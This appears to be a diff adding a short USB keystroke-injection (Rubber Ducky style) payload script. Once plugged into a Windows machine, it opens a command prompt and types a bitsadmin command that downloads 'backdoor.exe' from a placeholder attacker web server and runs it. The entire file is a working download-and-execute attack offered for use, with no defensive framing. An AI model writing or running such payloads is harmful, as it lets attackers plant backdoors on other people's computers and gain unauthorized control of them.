@@ -1,0 +1,9 @@
+REM Author: ['Smokey Nagata']
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING runas /user:%username% "cmd /c bitsadmin /transfer myDownloadJob /download /priority normal http://Your_Web_Server_Ip/backdoor.exe %USERPROFILE%\Downloads\backdoor.exe & start %USERPROFILE%\Downloads\backdoor.exe"
+ENTER
